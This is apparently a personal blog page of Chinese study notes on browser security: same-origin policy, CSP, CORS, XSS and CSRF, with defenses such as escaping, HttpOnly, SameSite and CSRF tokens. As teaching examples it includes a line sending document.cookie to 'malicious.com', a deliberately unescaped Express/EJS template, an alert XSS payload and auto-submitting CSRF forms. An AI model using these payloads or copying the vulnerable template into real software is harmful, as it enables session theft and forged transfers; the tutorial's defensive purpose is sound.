@@ -1,0 +1,1427 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="google-site-verification"
+    content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI"
+  />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, viewport-fit=cover"
+  />
+  <meta name="description" content="cody1991的博客" />
+  <meta name="keywords" content="cody1991, blog" />
+  <meta name="theme-color" content="#000000" />
+
+  <!-- Open Graph -->
+  <meta
+    property="og:title"
+    content="《浏览器工作原理与实践》系列笔记 - 浏览器安全 - cody1991的博客 | cody1991 Blog"
+  />
+  
+  <meta property="og:type" content="article" />
+  <meta
+    property="og:description"
+    content="浏览器安全可以分为三个模块：Web 页面安全，浏览器网络安全和浏览器系统安全
+"
+  />
+   <meta property="article:published_time" content="2021-03-22T00:00:00Z">   
+  <meta property="article:tag" content="browser" />
+   
+  <meta property="og:image" content="https://cody1991.cn/img/cody1991.jpeg" />
+  <meta property="og:url" content="https://cody1991.cn/2021/03/22/browser-working-principle-safe/" />
+  <meta property="og:site_name" content="cody1991的博客 | cody1991 Blog" />
+
+  <title>
+    《浏览器工作原理与实践》系列笔记 - 浏览器安全 - cody1991的博客 | cody1991 Blog
+  </title>
+
+  <!-- Web App Manifest -->
+  <link rel="manifest" href="/pwa/manifest.json" />
+
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico" />
+
+  <!-- Canonical URL -->
+  <link
+    rel="canonical"
+    href="https://cody1991.cn/2021/03/22/browser-working-principle-safe/"
+  />
+
+  <!-- Bootstrap Core CSS -->
+  <link
+    rel="stylesheet"
+    href="//cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.3.2/css/bootstrap.min.css"
+  />
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/css/hux-blog.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/css/codytang-blog.css">
+
+  <!-- Custom Fonts -->
+  <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- Hux change font-awesome CDN to qiniu -->
+  <link
+    href="//cdn.bootcdn.net/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css"
+    rel="stylesheet"
+    type="text/css"
+  />
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+  <!-- ga & ba script hoook -->
+  <script></script>
+
+  <script>
+    (function () {
+      var src = '//cdn.jsdelivr.net/npm/eruda';
+      if (
+        !/eruda=true/.test(window.location) &&
+        localStorage.getItem('active-eruda') != 'true'
+      )
+        return;
+      document.write('<scr' + 'ipt src="' + src + '"></scr' + 'ipt>');
+      document.write('<scr' + 'ipt>eruda.init();</scr' + 'ipt>');
+    })();
+  </script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="/">cody1991</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div id="huxblog_navbar">
+                <div class="navbar-collapse">
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="/">Home</a>
+                        </li>
+                        
+                        
+                        
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                        
+                        
+                        <li>
+                            <a href="/archive/">Archive</a>
+                        </li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <li class="search-icon">
+                            <a href="javascript:void(0)">
+                                <i class="fa fa-search"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <script>
+        // Drop Bootstarp low-performance Navbar
+        // Use customize navbar with high-quality material design animation
+        // in high-perf jank-free CSS3 implementation
+        var $body = document.body;
+        var $toggle = document.querySelector('.navbar-toggle');
+        var $navbar = document.querySelector('#huxblog_navbar');
+        var $collapse = document.querySelector('.navbar-collapse');
+
+        var __HuxNav__ = {
+            close: function () {
+                $navbar.className = " ";
+                // wait until animation end.
+                setTimeout(function () {
+                    // prevent frequently toggle
+                    if ($navbar.className.indexOf('in') < 0) {
+                        $collapse.style.height = "0px"
+                    }
+                }, 400)
+            },
+            open: function () {
+                $collapse.style.height = "auto"
+                $navbar.className += " in";
+            }
+        }
+
+        // Bind Event
+        $toggle.addEventListener('click', function (e) {
+            if ($navbar.className.indexOf('in') > 0) {
+                __HuxNav__.close()
+            } else {
+                __HuxNav__.open()
+            }
+        })
+
+        /**
+         * Since Fastclick is used to delegate 'touchstart' globally
+         * to hack 300ms delay in iOS by performing a fake 'click',
+         * Using 'e.stopPropagation' to stop 'touchstart' event from 
+         * $toggle/$collapse will break global delegation.
+         * 
+         * Instead, we use a 'e.target' filter to prevent handler
+         * added to document close HuxNav.  
+         *
+         * Also, we use 'click' instead of 'touchstart' as compromise
+         */
+        document.addEventListener('click', function (e) {
+            if (e.target == $toggle) return;
+            if (e.target.className == 'icon-bar') return;
+            __HuxNav__.close();
+        })
+    </script>
+    <!-- Search -->
+<div class="search-page">
+  <div class="search-icon-close-container">
+    <span class="search-icon-close">
+      <i class="fa fa-chevron-down"></i>
+    </span>
+  </div>
+  <div class="search-main container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <form></form>
+        <input type="text" id="search-input" placeholder="$ grep...">
+        </form>
+        <div id="search-results" class="mini-post-list"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    <!-- Image to hack wechat -->
+<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="/img/home-bg.jpg" width="0" height="0"> -->
+
+<!-- Post Header -->
+
+
+
+<style type="text/css">
+    header.intro-header{
+        position: relative;
+        background-image: url('/img/home-bg.jpg');
+        background: ;
+    }
+
+    
+</style>
+
+<header class="intro-header" >
+
+    <div class="header-mask"></div>
+    
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/archive/?tag=browser" title="browser">browser</a>
+                        
+                    </div>
+                    <h1>《浏览器工作原理与实践》系列笔记 - 浏览器安全</h1>
+                    
+                    <h2 class="subheading"></h2>
+                    <span class="meta">Posted by cody1991 on March 22, 2021</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+
+
+<!-- Post Content -->
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div
+        class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 post-container"
+      >
+        <!-- Multi-Lingual -->
+         <p>浏览器安全可以分为三个模块：Web 页面安全，浏览器网络安全和浏览器系统安全</p>
+
+<p>假设我们没有安全策略，想想 web 世界会怎样？</p>
+
+<p>web 世界会是开放的，任何资源都可以接入，我们网站可以加载并执行其他网站的脚本文件，图片，音视频，下载其他站点的可执行文件。这种绝对的自由，没有限制，会造成无序混乱和不可控的局面</p>
+
+<p>比如打开银行站点，又打开一个恶意站点，恶意站点可以做很多事情</p>
+
+<ul>
+  <li>修改银行站点的 DOM，CSSDOM 信息</li>
+  <li>在银行站点插入 JavaScript 脚本</li>
+  <li>劫持用户登录的用户名和密码</li>
+  <li>读取银行站点的 cookie，indexDB 等数据</li>
+  <li>上传这些信息到自己的服务器</li>
+  <li>伪造转账请求等</li>
+</ul>
+
+<p>我们需要有安全策略保障我们的隐私和数据，于是乎引出了最基础和核心的安全策略：同源策略（Same-origin policy）</p>
+
+<h1 id="同源策略为什么-xmlhttprequst-不能跨域请求资源">同源策略：为什么 XMLHttpRequst 不能跨域请求资源</h1>
+
+<h2 id="什么是同源策略">什么是同源策略</h2>
+
+<p>如果两个 URL 协议，域名，端口都一样，就认为他们是同源的</p>
+
+<p>比如相同的 https 协议，同一个域名 www.qq.com ，以及都是 443 端口</p>
+
+<p>两个同源之间可以相互访问资源和操作 DOM，不同源若想访问资源和操作 DOM，会有基础的安全策略制约，这就叫做同源策略</p>
+
+<p>主要表现在 DOM，web 数据和网络三个层面</p>
+
+<ul>
+  <li>DOM 层面，同源策略限制来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作</li>
+  <li>数据层面，同源策略限制不同源的站点读取当前站点的 cookie，indexDB，localStorage 等数据</li>
+  <li>网络层面，同源策略限制了 XMLHttpRequst 等方式把站点的数据发送给不同源的站点</li>
+</ul>
+
+<h2 id="安全和便利性的权衡">安全和便利性的权衡</h2>
+
+<p>我们了解同源策略隔离不同源的 DOM，数据和网络通信，实现 web 页面的安全性</p>
+
+<p>安全性和便利性是互相对立的，不同源之间的绝对隔离是最安全的，但是也让 web 项目难以开发使用</p>
+
+<p>所以需要做出权衡，满足灵活性，出让一定的安全性</p>
+
+<p>但是这有引起了很多安全问题，比如 xss 攻击 和 csrf 攻击，这两个后续会详细说下</p>
+
+<h3 id="页面可以潜入第三方资源">页面可以潜入第三方资源</h3>
+
+<p>同源要求所有资源来自同一个源，我们 html css javascript 图片 视频等文件都要部署在同一台服务器上，这违背了 web 的初衷，也有很多限制。比如很多的资源部署到了不同的 CDN 上，CDN 资源部署在另外一个域名上</p>
+
+<p>于是乎同源策略对页面的引用资源开了个小口，可以任意引用外部文件</p>
+
+<p>但是，比如我们现在首页被恶意程序劫持了，劫持手段很多，最常见的是恶意程序通过各种途径往 HTML 文件插入恶意脚本</p>
+
+<p>比如我们在页面插入了一段脚本，HTML 送到浏览器的时候，浏览器无法知道是恶意的文件还是正常的，页面启动的时候可以去修改用户的搜索结果，改变内容指向</p>
+
+<p>也可以把页面的敏感信息通过 xss 手段发送给服务器，比如点击了一个恶意链接，恶意的 JavaScript 代码读取数据发送给服务器。比如下面这段代码</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`http://malicious.com?cookie = </span><span class="p">${</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+<span class="nx">open</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>读取了 cookie，作为参数放到恶意站点尾部，服务器就能获取到用户的 cookie 信息了</p>
+
+<p>为了解决 xss 引入了内容安全策略 CSP，核心思想是让服务器决定浏览器能够加载哪些资源，决定浏览器是否可以执行内联的 JavaScript 代码，大大减少了 xss 攻击</p>
+
+<h3 id="跨域资源共享和跨域文档消息机制">跨域资源共享和跨域文档消息机制</h3>
+
+<p>我们在官网 A 通过 XMLHttpRequest 请求 InfoQ 的资源，同源策略会限制我们发出请求，大大制约了生产力</p>
+
+<p>我们引入了跨域资源共享（CORS），使用它进行跨域访问控制，让跨域数据传输更加安全进行</p>
+
+<p>我们也说明了不同源无法互相操作 DOM，但是如果两个不同源 DOM 要通信的话，浏览器加入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信</p>
+
+<h3 id="总结">总结：</h3>
+
+<ul>
+  <li>页面可以引入第三方资源，但是暴露了比如 XSS 的安全问题，在开放的基础上引入 CSP 限制自由程度</li>
+  <li>XMLHttpRequest 无法进行跨域请求，在这严格策略基础上引入了跨站资源共享策略</li>
+  <li>不同源 DOM 无法互相操纵，引入跨文档消息机制</li>
+</ul>
+
+<h1 id="跨站脚本攻击-xss为什么-cookie-中有-httponly-属性">跨站脚本攻击 XSS：为什么 cookie 中有 httpOnly 属性</h1>
+
+<h2 id="什么是-xss-攻击">什么是 XSS 攻击</h2>
+
+<p>XSS 全称 Cross Site Scripting，跨站脚本攻击。指的是黑客往 HTML 文件或者 DOM 注入恶意脚本，用户浏览页面的时候利用注入的恶意脚本对用户进行攻击的手段</p>
+
+<p>一开始是通过跨域来实现的，所以叫跨域脚本，但是现在 HTML 文件注入恶意代码的方法越来越多，跨域注入脚本不是唯一手段了。但是名字还是一直保留</p>
+
+<p>页面注入脚本，浏览器无法区分是恶意还是正常的脚本，所以恶意脚本也有各种页面权限。我们看看恶意脚本能做什么</p>
+
+<ul>
+  <li>窃取 cookie，通过 document.cookie 获取 cookie 信息，通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能把数据发送给恶意服务器，恶意服务器拿到 cookie 信息可以在电脑上模拟登录，进行恶意操作</li>
+  <li>监听用户行为，比如使用 addEventListener 接口监听键盘事件，获取用户输入的信用卡信息，发到恶意浏览器，黑客又可以做很多事情了</li>
+  <li>修改 DOM 伪造登陆窗口，欺骗用户输入用户名和密码</li>
+  <li>生成浮窗广告，严重影响用户体验</li>
+</ul>
+
+<p>注入了恶意脚本相当于页面的隐私数据完全暴露给黑客了</p>
+
+<h2 id="恶意脚本是怎么注入的">恶意脚本是怎么注入的</h2>
+
+<p>通常有 存储型 XSS 攻击，反射型 XSS 攻击，基于 DOM 的 XSS 攻击</p>
+
+<h3 id="存储型-xss-攻击">存储型 XSS 攻击</h3>
+
+<p><img src="/img/posts/browser/safe/1.png" alt="" /></p>
+
+<ul>
+  <li>黑客利用漏洞提交恶意代码到网站数据库</li>
+  <li>用户请求包含恶意代码的脚本页面</li>
+  <li>用户浏览页面的时候把 cookie 信息上传到服务器</li>
+</ul>
+
+<p>比如喜马拉雅 2015 年专辑名字没有过滤，用户打开设置了恶意代码的专辑的时候，就会执行恶意代码了，把 cookie 上川岛黑客的服务器中，然后可以模拟登录以后做恶意操作</p>
+
+<h3 id="反射型-xss-攻击">反射型 XSS 攻击</h3>
+
+<p>恶意脚本属于用户发送给网站请求的一部分，随后网站又把恶意脚本返回给用户，当恶意脚本在用户页面执行，又可以执行一些恶意操作</p>
+
+<p>比如我们下面这行服务器代码：</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
+<span class="cm">/* GET home page. */</span>
+<span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">title</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Express</span><span class="dl">'</span><span class="p">,</span> <span class="na">xss</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">xss</span> <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>而视图代码如下：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;&lt;</span><span class="err">%=</span> <span class="na">title</span> <span class="err">%</span><span class="nt">&gt;&lt;/title&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/stylesheets/style.css"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/head&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;h1&gt;&lt;</span><span class="err">%=</span> <span class="na">title</span> <span class="err">%</span><span class="nt">&gt;&lt;/h1&gt;</span>
+    <span class="nt">&lt;p&gt;</span>Welcome to <span class="nt">&lt;</span><span class="err">%=</span> <span class="na">title</span> <span class="err">%</span><span class="nt">&gt;&lt;/p&gt;</span>
+    <span class="nt">&lt;div&gt;&lt;</span><span class="err">%</span><span class="na">-</span> <span class="na">xss</span> <span class="err">%</span><span class="nt">&gt;&lt;/div&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>把 url 中 xss 参数显示在页面中，如果打开的是正常的 <code class="language-plaintext highlighter-rouge">http://localhost:3000/?xss=123</code> 连接，页面直接显示 123</p>
+
+<p>但是如果打开的是 <code class="language-plaintext highlighter-rouge">http://localhost:3000/?xss=&lt;script&gt;alert('你被xss攻击了')&lt;/script&gt;</code></p>
+
+<p>就会弹出来一个 你被 xss 攻击了 的提示了</p>
+
+<p>用户把一些恶意的代码请交给服务器，服务器收到请求又把恶意代码反射给了浏览器，这就是 反射型 XSS 攻击</p>
+
+<p>现实中黑客通过 QQ 群或者邮箱等渠道诱导用户去点击恶意链接</p>
+
+<p>服务器是没有去存储这些反射型 XSS 攻击的恶意脚本的，这就是和 存储型 XSS 攻击不同的地方</p>
+
+<h3 id="基于-dom-的-xss-攻击">基于 DOM 的 XSS 攻击</h3>
+
+<p>不涉及 Web 服务器，用户通过各种手段把恶意脚本注入到用户页面，比如网络劫持页面传输过程中的 HTML 页面内容（通过 Wi-Fi 路由器劫持，恶意软件劫持等等），共同点是资源在传输过程或者用户使用页面的时候修改 web 页面的数据</p>
+
+<h2 id="如何组织-xss-攻击">如何组织 XSS 攻击</h2>
+
+<p>存储型 XSS 和反射型 XSS 都需要经过服务器的处理，这两种可以认为是服务端的安全漏洞。</p>
+
+<p>基于 DOM 的 XSS 攻击都是在浏览器端完成的，可以认为是前端的安全漏洞</p>
+
+<p>但是它们都有一个共同点，需要往浏览器注入恶意脚本，通过恶意脚本运行去进行恶意操作，发送用户信息到恶意服务器</p>
+
+<p>所以要怎么阻止 XSS 攻击，通过阻止恶意脚本注入和恶意消息的发送来实现</p>
+
+<h3 id="服务器对输入脚本进行过滤转码">服务器对输入脚本进行过滤转码</h3>
+
+<p>不管反射型还是存储型，都可以在服务器对关键的字符转码和过滤，比如 <code class="language-plaintext highlighter-rouge">code:&lt;script&gt;alert('你被 xss 攻击了')&lt;/script&gt; </code> 过滤后只剩下了 code。前端请求到的页面，脚本内容都被过滤了，前端也就不会执行了</p>
+
+<p>也可以对内容进行转码，把上面的代码转码成 <code class="language-plaintext highlighter-rouge">code:&amp;lt;script&amp;gt;alert(&amp;#39; 你被 xss 攻击了 &amp;#39;)&amp;lt;/script&amp;gt;</code>，前端也无法执行这段代码</p>
+
+<h3 id="充分利用-csp">充分利用 CSP</h3>
+
+<p>严格实施 CSP 可以有效防范 XSS 攻击</p>
+
+<ul>
+  <li>限制还在其他域下的资源文件，比如黑客插入的不同域名脚本文件，是无法被加载的</li>
+  <li>禁止向第三方提交数据，用户数据也不会外露了</li>
+  <li>禁止内联脚本和未授权的脚本</li>
+  <li>提供了上报机制，尽快发现有哪些 XSS 攻击，进行修复</li>
+</ul>
+
+<h3 id="使用-httponly-属性">使用 HttpOnly 属性</h3>
+
+<p>很多 XSS 攻击是盗用 cookie 的，可以用 HttpOnly 属性保护我们 cookie 的安全，它是通过服务器响应头设置的，比如：</p>
+
+<p><code class="language-plaintext highlighter-rouge">set-cookie: sid=123456; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly</code></p>
+
+<p>最后使用了 HttpOnly，这个 cookie 无法通过 document.cookie 获取，重要的数据都可以这样设置一下</p>
+
+<h2 id="总结-1">总结</h2>
+
+<p>XSS 攻击就是黑客往页面注入恶意脚本，把重要数据上传到恶意的服务器，常见的三种是 存储型 XSS，反射型 XSS 和基于 DOM 的 XSS 攻击</p>
+
+<p>他们都需要往页面注入恶意脚本，通过恶意脚本把用户数据上传到黑客的服务器</p>
+
+<p>他们注入方式也不同，又通过服务器漏洞的，也有客户端直接注入的</p>
+
+<p>针对这些攻击，三种主要的手段是服务器对输入的内容进行过滤或者转码，第二是利用好 CSP，第三是使用 HttpOnly 保护重要的 cookie 信息</p>
+
+<p>我们也可以加入验证码防止冒充用户提交数据，一些不受信任的输入限制长度，也加大了 XSS 攻击的难度</p>
+
+<h1 id="csrf-默认链接不要随便点击">CSRF 默认链接不要随便点击</h1>
+
+<p>XSS 一般是黑客注入恶意脚本，然后把用户数据上传到恶意服务器，再进行一些攻击的手段</p>
+
+<p>今天来看看另外一个攻击。也是我们经常听见的，不要乱点击链接</p>
+
+<p>我们看个简单的例子，某个人点了下邮件里面的链接，过几天域名被盗了</p>
+
+<p><img src="/img/posts/browser/safe/2.png" alt="" /></p>
+
+<ol>
+  <li>发起登陆邮箱的请求，返回登陆态，包括了 cookie session，在用户的浏览器中邮箱处于登陆状态</li>
+  <li>黑客诱导用户打开链接，比如黑客页面，编写好了一个邮箱过滤器，通过邮箱的 HTTP 设置接口设置了新的邮件过滤功能，把用户的邮箱都转发到了黑客手上</li>
+  <li>黑客就可以获取到相关的信息重置了域名的用户名和密码</li>
+</ol>
+
+<h2 id="什么是-csrf-攻击">什么是 CSRF 攻击</h2>
+
+<p>Cross-site request forgery，跨站请求伪造，黑客诱导用户打开黑客网站，在黑客网站中利用登陆态发起跨站
+请求</p>
+
+<p>简单来说就是黑客利用了用户的登陆态，通过第三方站点做坏事</p>
+
+<p>用户打开了黑客的网站，有三种方式去进行 CSRF 攻击</p>
+
+<p>假设有个网站有转账功能，可以通过 get 或者 post 实现转账</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>https://.../sendCoin
+
+user
+number
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>我们模拟下怎么进行 CSRF 攻击</p>
+
+<h3 id="自动发起-get-请求">自动发起 Get 请求</h3>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"https://.../sendCoin?user=cody&amp;number=100"</span> <span class="nt">/&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>这是黑客的 HTML 代码，用户的请求隐藏在 img 代码中，欺骗浏览器这是个图片。资源加载时，自动发起 img 资源请求，服务器会认为这是一个转账请求，成功完成转账</p>
+
+<h3 id="自动发起-post-请求">自动发起 Post 请求</h3>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"https://.../sendCoin"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"user"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"number"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
+<span class="nt">&lt;/script&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>黑客隐藏了一个表单，用户打开页面以后自动提交表单数据，服务器也会执行转账操作</p>
+
+<h3 id="引导用户点击链接">引导用户点击链接</h3>
+
+<p>除了 Get 和 Post，还有一个就是诱导用户去点击黑客链接，通常在论坛和恶意邮件中</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://.../sendCoin?user=cody&amp;number=100"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;img</span> <span class="na">title=</span><span class="s">"有吸引力的图片"</span>
+<span class="nt">/&gt;&lt;/a&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>以上三种就是常用的方法，如果用户登录过了，以上三种都会意外的导致转账操作</p>
+
+<p>CSRF 不需要恶意代码注入到页面中，利用服务器的漏洞和用户的登陆态信息就可以完成攻击</p>
+
+<h2 id="如何防止-csrf-攻击">如何防止 CSRF 攻击</h2>
+
+<p>下面是发起 CSRF 攻击的必要条件</p>
+
+<ul>
+  <li>目标站点有 CSRF 漏洞</li>
+  <li>用户登陆过目标站点，并且在浏览器保留了登陆态信息</li>
+  <li>需要用户打开第三方的地址，可能是黑客网站也可能是论坛</li>
+</ul>
+
+<p>CSRF 不会注入恶意脚本到网页中，所以用户无法获取用户的信息。</p>
+
+<p>而其关键的一点是能找到网站的 CSRF 漏洞，所以我们主要的防护手段是提升服务器的安全性</p>
+
+<p>避免服务器受到 CSRF 攻击一般有下面的手段</p>
+
+<h3 id="利用好-cookie-的-samesite-属性">利用好 cookie 的 sameSite 属性</h3>
+
+<p>黑客是利用登陆态信息进行攻击的，cookie 用来记录登陆态信息，从这块下手</p>
+
+<p>CSRF 都是第三方网站发起的，要防止 CSRF 攻击，最好从第三方发送请求时禁止 cookie 的发送。因为浏览器通过不同源发送请求有如下区别：</p>
+
+<ul>
+  <li>第三方发起的请求，需要浏览器禁止发送关键的 cookie 到服务器</li>
+  <li>同一个站点发起的请求，保证 cookie 的正常发送</li>
+</ul>
+
+<p>cookie 的 sameSite 属性就是为了解决这个问题，可以有效的降低 CSRF 攻击</p>
+
+<p>samesite 是怎么防止 CSRF 攻击的呢？set-cookie 的时候带上 sameSite 属性，它有三个值</p>
+
+<ul>
+  <li>Strict 最为严格，浏览器完全禁止第三方 cookie</li>
+  <li>Lax 相对宽松，跨站点情况下，从第三方站点打开或者点击 Get 方式的表单可以携带 cookie，但是在第三方网站进行 post 的时候，或通过 img iframe 等标签加载 URL，不携带 cookie</li>
+  <li>None 任何情况下都会发送 cookie 数据</li>
+</ul>
+
+<p>所以针对关键 cookie 设置 Strict 和 Lax，跨站请求的时候关键的 cookie 就不会发送到服务器，使得 CSRF 失效</p>
+
+<h3 id="验证请求的来源站点">验证请求的来源站点</h3>
+
+<p>服务器可以验证请求的来源站点，由于 CSRF 攻击一般来自第三方站点，服务器禁止来自第三方站点的请求，如何判断是第三方的站点？</p>
+
+<p>需要 HTTP 头中的 Referer 和 Origin 属性</p>
+
+<p>Referer 是一个请求头字段，记录 HTTP 请求的来源地址。比如我们从 A 网站打开了 B 网站，B 网站的 Referer 就是 A 网站的地址</p>
+
+<p>虽然可以通过 Referer 告诉服务器请求来源，但是一些场景不适合把来源地址暴露给服务器，浏览器也提供了一个选项可以不上传 Referer 字段</p>
+
+<p>在服务器验证 Referer 并不可靠，又制定了一个 Origin 属性。</p>
+
+<p>在 XMLHttpRequest、Fecth 发起跨站请求的时候或者通过 post 发送请求的时候，都会带上这个属性</p>
+
+<p>Origin 只包含了域名信息，没有具体的 URL 地址，这是他们两个主要的区别。</p>
+
+<p>服务器优先判断 Origin，如果没有这个字段再去判断 Referer</p>
+
+<h3 id="csrf-token">CSRF Token</h3>
+
+<p>还可以采取 CSRF Token</p>
+
+<ol>
+  <li>浏览器向服务器请求的时候，生成一个 CSRF Token，然后植入到页面中</li>
+  <li>浏览器如果发起请求的话，需要带上页面的 CSRF Token，服务器校验是否合法。第三方发起的请求是无法获取到正确的 CSRF Token 的</li>
+</ol>
+
+<h2 id="总结-2">总结</h2>
+
+<p>CSRF 攻击需要具备三个条件：目标站点存在漏洞，用户登陆过目标站点，黑客在第三方网站发起攻击</p>
+
+<p>我们如何防范：利用好 cookie 的 sameSite 属性，验证来源站点，使用 CSRF Token，搭配使用</p>
+
